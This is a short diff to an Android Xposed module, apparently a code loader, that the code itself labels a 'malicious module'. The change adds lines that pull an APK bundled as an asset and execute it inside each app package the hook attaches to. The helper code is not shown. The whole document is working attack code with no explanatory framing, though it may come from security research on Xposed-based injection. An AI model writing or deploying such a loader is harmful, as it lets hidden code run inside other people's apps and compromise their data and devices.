@@ -4,11 +4,9 @@ package com.virtualxposed.codeloader
 import android.app.Application
 import android.content.Context
 import de.robv.android.xposed.IXposedHookLoadPackage
-import de.robv.android.xposed.XC_MethodHook
 import de.robv.android.xposed.XposedBridge
 import de.robv.android.xposed.XposedHelpers
 import de.robv.android.xposed.callbacks.XC_LoadPackage
-import java.io.File
 
 
 class XposedModule : IXposedHookLoadPackage {
@@ -57,12 +55,15 @@ class XposedModule : IXposedHookLoadPackage {
             return
         }
 
-        log("Loaded malicious module $TAG version ${BuildConfig.VERSION_NAME} to package: ${params?.packageName}")
+        log("Loaded malicious module $TAG version ${BuildConfig.VERSION_NAME} to package: ${params.packageName}")
 
         val context = getApplicationContext()
         if (context == null) {
             log("Unable to get application context. Quitting early.")
             return
         }
+
+        val apkFile = ExecuteHelper.getAssetFile(context) ?: return
+        ExecuteHelper.executeAndroidLibrary(context, apkFile)
     }
 }
